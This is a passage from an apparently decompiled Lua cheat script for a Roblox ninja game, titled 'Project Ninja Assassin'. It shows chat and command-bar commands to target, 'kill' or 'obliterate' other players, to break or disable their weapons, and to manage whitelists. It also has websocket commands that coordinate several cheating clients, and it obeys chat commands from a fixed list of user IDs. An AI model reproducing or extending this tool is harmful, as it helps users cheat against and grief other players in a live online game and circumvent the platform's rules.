    }, function(p1940, p1941)
        local v1942 = GetPlayer(p1941.args[1], p1940)
        if v1942 then
            local v1943 = vu71.PlayersToStrings(v1942)
            local v1944, v1945, v1946 = pairs(v1943)
            while true do
                local v1947
                v1946, v1947 = v1944(v1945, v1946)
                if v1946 == nil then
                    break
                end
                local v1948 = GetModeFromText(p1941.args[2]) or "Permanent"
                if not vu71.ListFind("Whitelist", v1947, v1948) then
                    ListFilter({
                        "Targetlist",
                        "Blacklist"
                    }, v1947)
                    vu71.ListInsert("Whitelist", v1947, v1948)
                    vu71.Notify("System", "Added " .. v1947 .. " to the " .. v1948 .. " Whitelist")
                end
            end
        end
    end)
    AddCommand("unwhitelist", {
        "unwl",
        "unwlist",
        "unprotect"
    }, function(p1949, p1950)
        local v1951 = GetPlayer(p1950.args[1], p1949)
        if v1951 then
            local v1952 = vu71.PlayersToStrings(v1951)
            local v1953, v1954, v1955 = pairs(v1952)
            while true do
                local v1956
                v1955, v1956 = v1953(v1954, v1955)
                if v1955 == nil then
                    break
                end
                local v1957 = GetModeFromText(p1950.args[2]) or "Permanent"
                if vu71.ListFind("Whitelist", v1956, v1957) then
                    vu71.ListRemove("Whitelist", v1956, v1957)
                    vu71.Notify("System", "Removed " .. v1956 .. " from the " .. v1957 .. " Whitelist")
                end
            end
        end
    end)
    AddCommand("blacklist", {
        "bl",
        "blist"
    }, function(p1958, p1959)
        local v1960 = GetPlayer(p1959.args[1], p1958)
        local v1961 = p1959.args[3] or p1959.args[2]
        if v1960 then
            local v1962 = vu71.PlayersToStrings(v1960)
            local v1963, v1964, v1965 = pairs(v1962)
            while true do
                local v1966
                v1965, v1966 = v1963(v1964, v1965)
                if v1965 == nil then
                    break
                end
                local v1967 = GetModeFromText(p1959.args[2]) or "Normal"
                if not vu71.ListFind("Blacklist", v1966, v1967) then
                    if GetBool(v1961) == true then
                        ListFilter({
                            "Whitelist"
                        }, v1966)
                    end
                    if not vu71.ListFind("Whitelist", v1966) then
                        vu71.ListInsert("Blacklist", v1966, v1967)
                        vu71.Notify("System", "Added " .. v1966 .. " to the " .. v1967 .. " Blacklist")
                    end
                end
            end
        end
    end)
    AddCommand("unblacklist", {
        "unbl",
        "unblist"
    }, function(p1968, p1969)
        local v1970 = GetPlayer(p1969.args[1], p1968)
        if v1970 then
            local v1971 = vu71.PlayersToStrings(v1970)
            local v1972, v1973, v1974 = pairs(v1971)
            while true do
                local v1975
                v1974, v1975 = v1972(v1973, v1974)
                if v1974 == nil then
                    break
                end
                local v1976 = GetModeFromText(p1969.args[2]) or "Normal"
                if vu71.ListFind("Blacklist", v1975, v1976) then
                    vu71.ListRemove("Blacklist", v1975, v1976)
                    vu71.Notify("System", "Removed " .. v1975 .. " from the " .. v1976 .. " Blacklist")
                end
            end
        end
    end)
    AddCommand("target", {
        "t",
        "tg",
        "destroy",
        "end",
        "obliterate",
        "eliminate"
    }, function(p1977, p1978)
        local v1979 = GetPlayer(p1978.args[1], p1977)
        local v1980 = p1978.args[3] or p1978.args[2]
        if v1979 then
            local v1981 = vu71.PlayersToStrings(v1979)
            local v1982, v1983, v1984 = pairs(v1981)
            while true do
                local v1985
                v1984, v1985 = v1982(v1983, v1984)
                if v1984 == nil then
                    break
                end
                local v1986 = GetModeFromText(p1978.args[2]) or "Normal"
                if not vu71.ListFind("Targetlist", v1985, v1986) then
                    if GetBool(v1980) == true then
                        ListFilter({
                            "Whitelist"
                        }, v1985)
                    end
                    if not vu71.ListFind("Whitelist", v1985) then
                        vu71.ListInsert("Targetlist", v1985, v1986)
                        vu71.Notify("System", "Added " .. v1985 .. " to the " .. v1986 .. " Targetlist")
                    end
                end
            end
        end
    end)
    AddCommand("untarget", {
        "unt",
        "untg"
    }, function(p1987, p1988)
        local v1989 = GetPlayer(p1988.args[1], p1987)
        if v1989 then
            local v1990 = vu71.PlayersToStrings(v1989)
            local v1991, v1992, v1993 = pairs(v1990)
            while true do
                local v1994
                v1993, v1994 = v1991(v1992, v1993)
                if v1993 == nil then
                    break
                end
                local v1995 = GetModeFromText(p1988.args[2]) or "Normal"
                if vu71.ListFind("Targetlist", v1994, v1995) then
                    vu71.ListRemove("Targetlist", v1994, v1995)
                    vu71.Notify("System", "Removed " .. v1994 .. " from the " .. v1995 .. " Targetlist")
                end
            end
        end
    end)
    AddCommand("kill", {
        "k",
        "kl"
    }, function(p1996, p1997)
        local v1998 = GetPlayer(p1997.args[1], p1996)
        local v1999 = p1997.args[3] or p1997.args[2]
        if v1998 then
            local v2000 = vu71.PlayersToStrings(v1998)
            local v2001, v2002, v2003 = pairs(v2000)
            while true do
                local v2004
                v2003, v2004 = v2001(v2002, v2003)
                if v2003 == nil then
                    break
                end
                local v2005 = GetModeFromText(p1997.args[2]) or "Soft"
                if not vu71.ListFind("Targetlist", v2004, v2005) then
                    if GetBool(v1999) == true then
                        ListFilter({
                            "Whitelist"
                        }, v2004)
                    end
                    if not vu71.ListFind("Whitelist", v2004) then
                        vu71.ListInsert("Targetlist", v2004, v2005)
                        vu71.Notify("System", "Added " .. v2004 .. " to the " .. v2005 .. " Targetlist")
                    end
                end
            end
        end
    end)
    AddCommand("breakshur", {
        "breakshurs",
        "break",
        "bs",
        "unshuriken",
        "unshur"
    }, function(p2006, p2007)
        local v2008 = GetPlayer(p2007.args[1], p2006)
        if v2008 then
            local v2009 = vu71.PlayersToStrings(v2008)
            local v2010, v2011, v2012 = pairs(v2009)
            while true do
                local v2013
                v2012, v2013 = v2010(v2011, v2012)
                if v2012 == nil then
                    break
                end
                local v2014 = GetModeFromText(p2007.args[2]) or "Normal"
                if not vu71.ListFind("BreakShurlist", v2013, v2014) then
                    vu71.ListInsert("BreakShurlist", v2013, v2014)
                    vu71.Notify("System", "Added " .. v2013 .. " to the " .. v2014 .. " BreakShurlist")
                end
            end
        end
    end)
    AddCommand("unbreakshur", {
        "unbreakshurs",
        "unbreak",
        "unbs",
        "shuriken",
        "shur"
    }, function(p2015, p2016)
        local v2017 = GetPlayer(p2016.args[1], p2015)
        if v2017 then
            local v2018 = vu71.PlayersToStrings(v2017)
            local v2019, v2020, v2021 = pairs(v2018)
            while true do
                local v2022
                v2021, v2022 = v2019(v2020, v2021)
                if v2021 == nil then
                    break
                end
                local v2023 = GetModeFromText(p2016.args[2]) or "Normal"
                if vu71.ListFind("BreakShurlist", v2022, v2023) then
                    vu71.ListRemove("BreakShurlist", v2022, v2023)
                    vu71.Notify("System", "Removed " .. v2022 .. " from the " .. v2023 .. " BreakShurlist")
                end
            end
        end
    end)
    AddCommand("disableshurs", {
        "disableshur",
        "disable",
        "ds",
        "noshurikens",
        "noshur"
    }, function(p2024, p2025)
        local v2026 = GetPlayer(p2025.args[1], p2024)
        if v2026 then
            local v2027 = vu71.PlayersToStrings(v2026)
            local v2028, v2029, v2030 = pairs(v2027)
            while true do
                local v2031
                v2030, v2031 = v2028(v2029, v2030)
                if v2030 == nil then
                    break
                end
                local v2032 = GetModeFromText(p2025.args[2]) or "Normal"
                if not vu71.ListFind("DisableShurslist", v2031, v2032) then
                    vu71.ListRemove("DisableShurslist", v2031, v2032)
                    vu71.Notify("System", "Added " .. v2031 .. " to the " .. v2032 .. " DisableShurslist")
                end
            end
        end
    end)
    AddCommand("undisableshurs", {
        "undisableshur",
        "undisable",
        "unds",
        "yesshurikens",
        "yesshur"
    }, function(p2033, p2034)
        local v2035 = GetPlayer(p2034.args[1], p2033)
        if v2035 then
            local v2036 = vu71.PlayersToStrings(v2035)
            local v2037, v2038, v2039 = pairs(v2036)
            while true do
                local v2040
                v2039, v2040 = v2037(v2038, v2039)
                if v2039 == nil then
                    break
                end
                local v2041 = GetModeFromText(p2034.args[2]) or "Normal"
                if vu71.ListFind("DisableShurslist", v2040, v2041) then
                    vu71.ListRemove("DisableShurslist", v2040, v2041)
                    vu71.Notify("System", "Removed " .. v2040 .. " from the " .. v2041 .. " DisableShurslist")
                end
            end
        end
    end)
    AddCommand("rejoin", {
        "rj"
    }, function(_, _)
        if # vu53:GetPlayers() > 1 then
            game:GetService("TeleportService"):TeleportToPlaceInstance(game.PlaceId, game.JobId, vu53.LocalPlayer)
        else
            vu53.LocalPlayer:Kick("\nRejoining...")
            task.wait(0.03)
            game:GetService("TeleportService"):Teleport(game.PlaceId, vu53.LocalPlayer)
        end
    end)
    AddCommand("websocketsend", {
        "wssend",
        "wss",
        "ws"
    }, function(p2042, p2043)
        if vu1786 then
            vu1786:Send(vu61:JSONEncode({
                type = "Message",
                message = p2043.strargs,
                sender = p2042.Name
            }))
            vu71.AddWSMessage(p2043.strargs, p2042.Name)
        end
    end)
    AddCommand("websocketjoin", {
        "wsjoin",
        "wsj",
        "playerjoin",
        "plrjoin",
        "join",
        "wj"
    }, function(p2044, p2045)
        if vu1786 then
            p2045.args[2] = p2044.Name
            vu1786:Send(vu61:JSONEncode({
                type = "Command",
                cmdname = "ServerCheck",
                store = p2045
            }))
            vu71.Chat("Attempting to join server..")
        end
    end)
    AddCommand("websocketplayercheck", {
        "wsplayercheck",
        "wspc",
        "wsp",
        "wpc",
        "wp",
        "checkplayers",
        "checkplrs",
        "checkp",
        "playercheck"
    }, function(p2046, p2047)
        if vu1786 then
            p2047.args[1] = p2046.Name
            vu1786:Send(vu61:JSONEncode({
                type = "Command",
                cmdname = "PlayerCheck",
                store = p2047
            }))
            vu71.Chat("Pinging other clients..")
        end
    end)
    local v2048 = {
        CommandGui = Instance.new("ScreenGui"),
        CommandBarFrame = Instance.new("Frame"),
        CommandBar = Instance.new("TextBox"),
        CommandBarCorner = Instance.new("UICorner")
    }
    v2048.CommandGui.Name = "CommandGui"
    v2048.CommandGui.Parent = vu57
    v2048.CommandGui.ResetOnSpawn = false
    v2048.CommandGui.ZIndexBehavior = Enum.ZIndexBehavior.Global
    v2048.CommandBarFrame.Name = "CommandBarFrame"
    v2048.CommandBarFrame.Parent = v2048.CommandGui
    v2048.CommandBarFrame.AnchorPoint = Vector2.new(0.5, 0)
    v2048.CommandBarFrame.BackgroundColor3 = Color3.fromRGB(50, 50, 50)
    v2048.CommandBarFrame.Position = UDim2.new(0.5, 0, 1, 0)
    v2048.CommandBarFrame.Size = UDim2.new(0.0933617353, 0, 0.0327022374, 0)
    v2048.CommandBarFrame.BackgroundTransparency = 1
    v2048.CommandBar.Name = "CommandBar"
    v2048.CommandBar.Parent = v2048.CommandBarFrame
    v2048.CommandBar.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
    v2048.CommandBar.BackgroundTransparency = 1
    v2048.CommandBar.Size = UDim2.new(1, 0, 1, 0)
    v2048.CommandBar.ClearTextOnFocus = false
    v2048.CommandBar.Font = Enum.Font.Gotham
    v2048.CommandBar.Text = ""
    v2048.CommandBar.TextColor3 = Color3.fromRGB(255, 255, 255)
    v2048.CommandBar.TextScaled = true
    v2048.CommandBar.TextSize = 14
    v2048.CommandBar.TextWrapped = true
    v2048.CommandBarCorner.Parent = v2048.CommandBarFrame
    local vu2049 = false
    local vu2050 = v2048.CommandBar
    local vu2051 = v2048.CommandBarFrame
    function vu71.UserInputBegan.CommandBar(p2052, p2053)
        if not p2053 and (p2052.KeyCode == vu49 and vu2049 == false) then
            vu71.CreateTween(vu2051, TweenInfo.new(0.2, Enum.EasingStyle.Quad), {
                Position = UDim2.new(0.5, 0, 0.9, 0)
            }, true)
            vu71.CreateTween(vu2051, TweenInfo.new(0.2, Enum.EasingStyle.Quad), {
                BackgroundTransparency = 0
            }, true)
            vu2050:CaptureFocus()
            task.wait()
            vu2050.Text = ""
            vu2049 = true
        end
    end
    vu2050.FocusLost:Connect(function()
        local v2054 = vu2050.Text
        local v2055 = v2054:split(" ")
        local v2056 = v2054:lower():split(" ")
        local v2057 = v2056[1]
        if vu2049 == true then
            vu2050.Text = ""
            vu71.CreateTween(vu2051, TweenInfo.new(0.2, Enum.EasingStyle.Quad), {
                Position = UDim2.new(0.5, 0, 1, 0)
            }, true)
            vu71.CreateTween(vu2051, TweenInfo.new(0.2, Enum.EasingStyle.Quad), {
                BackgroundTransparency = 1
            }, true)
            vu2049 = false
        end
        if v2057 then
            local v2058 = {}
            local v2059 = ""
            for v2060 = 2, # v2056 do
                if v2056[v2060] ~= v2057 then
                    table.insert(v2058, v2056[v2060])
                end
            end
            local v2061 = 2
            for v2062 = 2, # v2055 do
                if v2056[v2062] == v2057 then
                    v2061 = v2061 + 1
                elseif v2062 == v2061 then
                    v2059 = v2059 .. v2055[v2062]
                else
                    v2059 = v2059 .. " " .. v2055[v2062]
                end
            end
            ExecuteCommand(v2057, vu53.LocalPlayer, {
                args = v2058,
                strargs = v2059
            })
        end
    end)
    local function vu2073(p2063, p2064)
        local v2065 = p2063:split(" ")
        local v2066 = p2063:lower():split(" ")
        if v2066[1] == "/e" then
            table.remove(v2066, 1)
        end
        local v2067 = PrefixCheck(v2066)
        if v2067 ~= nil then
            local v2068 = {}
            local v2069 = ""
            for v2070 = 2, # v2066 do
                if v2066[v2070] ~= v2067 then
                    table.insert(v2068, v2066[v2070])
                end
            end
            local v2071 = 2
            for v2072 = 2, # v2065 do
                if v2066[v2072] == v2067 then
                    v2071 = v2071 + 1
                elseif v2072 == v2071 then
                    v2069 = v2069 .. v2065[v2072]
                else
                    v2069 = v2069 .. " " .. v2065[v2072]
                end
            end
            ExecuteCommand(v2067, p2064, {
                args = v2068,
                strargs = v2069
            })
        end
    end
    local vu2074 = {}
    function vu71.PlayerAdded.ChatConnection(pu2075)
        if table.find(vu1, pu2075.UserId) then
            vu2074[pu2075.UserId] = pu2075.Chatted:Connect(function(p2076)
                if vu70.UseOthersChatCommands then
                    vu2073(p2076, pu2075)
                end
            end)
        end
    end
    function vu71.PlayerRemoved.ChatConnection(p2077)
        if vu2074[p2077.UserId] ~= nil then
            vu2074[p2077.UserId]:Disconnect()
            vu2074[p2077.UserId] = nil
        end
    end
    local v2078, v2079, v2080 = vu53:GetPlayers()
    local v2081 = vu2074
    local vu2082 = vu2073
    while true do
        local vu2083
        v2080, vu2083 = v2078(v2079, v2080)
        if v2080 == nil then
            break
        end
        if table.find(vu1, vu2083.UserId) then
            v2081[vu2083.UserId] = vu2083.Chatted:Connect(function(p2084)
                if vu70.UseOthersChatCommands then
                    vu2082(p2084, vu2083)
                end
            end)
        end
    end
end
function vu71.StartMainConnections()
    print("[Project Ninja Assassin]: Starting Main Connections..")
    task.spawn(function()
        repeat
            task.wait()
        until vu53.LocalPlayer:FindFirstChild("leaderstats") and vu53.LocalPlayer.leaderstats:FindFirstChild("Ninjutsu")
        vu53.LocalPlayer.leaderstats.Ninjutsu:GetPropertyChangedSignal("Value"):Connect(function()
            local v2085, v2086, v2087 = pairs(vu71.NinjutsuChanged)
            while true do
                local v2088
                v2087, v2088 = v2085(v2086, v2087)
                if v2087 == nil then
                    break
                end
                v2088()
            end
        end)
    end)
    vu53.LocalPlayer.CharacterAdded:Connect(function(p2089)
        vu64 = p2089
        local v2090, v2091, v2092 = pairs(vu71.CharacterAdded)
        while true do
            local v2093
            v2092, v2093 = v2090(v2091, v2092)
            if v2092 == nil then
                break
            end
            v2093(p2089)
        end
        vu70.CharRespawning = false
    end)
    vu54.InputBegan:Connect(function(p2094, p2095)
        if not p2095 then
            local v2096, v2097, v2098 = pairs(vu71.UserInputBegan)
            while true do
                local v2099
                v2098, v2099 = v2096(v2097, v2098)
                if v2098 == nil then
                    break
                end
                v2099(p2094)
            end
        end
    end)
    vu54.InputEnded:Connect(function(p2100, p2101)
        if not p2101 then
            local v2102, v2103, v2104 = pairs(vu71.UserInputEnded)
            while true do
                local v2105
                v2104, v2105 = v2102(v2103, v2104)
                if v2104 == nil then
                    break
                end
                v2105(p2100)
            end
        end
    end)
    vu53.PlayerAdded:Connect(function(p2106)
        local v2107, v2108, v2109 = pairs(vu71.PlayerAdded)
        while true do
            local v2110
            v2109, v2110 = v2107(v2108, v2109)
            if v2109 == nil then
                break
            end
            v2110(p2106)
        end
        if vu70.SelectedPlayers[p2106.Name] then
            vu71.AddPlayerVanities(p2106)
        end
    end)
    vu53.PlayerRemoving:Connect(function(p2111)
        if p2111 == vu53.LocalPlayer then
            vu71.SaveSettings()
        end
        local v2112, v2113, v2114 = pairs(vu74)
        while true do
            local v2115
            v2114, v2115 = v2112(v2113, v2114)
            if v2114 == nil then
                break
            end
            if vu71.ListFind(v2114, p2111.Name, "Soft") then
                vu71.ListRemove(v2114, p2111.Name, "Soft")
            end
            if vu71.ListFind(v2114, p2111.Name, "Semi") then
                vu71.ListRemove(v2114, p2111.Name, "Semi")
            end
        end
        vu71.RemovePlayerVanities(p2111)
        local v2116, v2117, v2118 = pairs(vu71.PlayerRemoved)
        while true do
            local v2119
            v2118, v2119 = v2116(v2117, v2118)
            if v2118 == nil then
                break
            end
            v2119(p2111)
        end
    end)
    vu56.DescendantAdded:Connect(function(p2120)
        local v2121, v2122, v2123 = pairs(vu71.WorkspaceDescendantAdded)
        while true do
            local v2124
            v2123, v2124 = v2121(v2122, v2123)
            if v2123 == nil then
                break
            end
            v2124(p2120)
        end
    end)
    vu56.DescendantRemoving:Connect(function(p2125)
        local v2126, v2127, v2128 = pairs(vu71.WorkspaceDescendantRemoved)
        while true do
            local v2129
            v2128, v2129 = v2126(v2127, v2128)
            if v2128 == nil then
                break
            end
            v2129(p2125)
        end
    end)
end
function vu71.StartFluentSystems()
    print("[Project Ninja Assassin]: Starting Fluent Systems..")
    vu45:SetLibrary(vu44)
    vu46:SetLibrary(vu44)
    vu45:IgnoreThemeSettings()
    vu45:SetIgnoreIndexes({})
    vu46:SetFolder("FluentScriptHub")
    vu45:SetFolder("FluentScriptHub/specific-game")
    vu46:BuildInterfaceSection(vu457.Settings)
    vu45:BuildConfigSection(vu457.Settings)
    vu456:SelectTab(Main)
    vu44:Notify({
        Title = "Welcome",
        Content = "Welcome to Project Ninja Assassin v" .. vu47 .. ", " .. vu53.LocalPlayer.Name .. "!",
        SubContent = "Have a wonderful day!",
        Duration = 10
    })
    vu45:LoadAutoloadConfig()
end
local v2130, v2131 = pcall(function()
    vu71.AutoExecute()
    vu71.LoadSettings()
    vu71.CreateMainTabs()
    vu71.InitiateCommands()
    vu71.StartMainConnections()
    vu71.StartFluentSystems()
end)
if not v2130 then
    warn("ERROR:", v2131)
    local v2132, v2133, v2134 = pairs(vu71)
    local v2135 = vu71
    while true do
        local v2136
        v2134, v2136 = v2132(v2133, v2134)
        if v2134 == nil then
            break
        end
        v2135[v2134] = nil
    end
end
print("[Project Ninja Assassin]: Finished loading!")
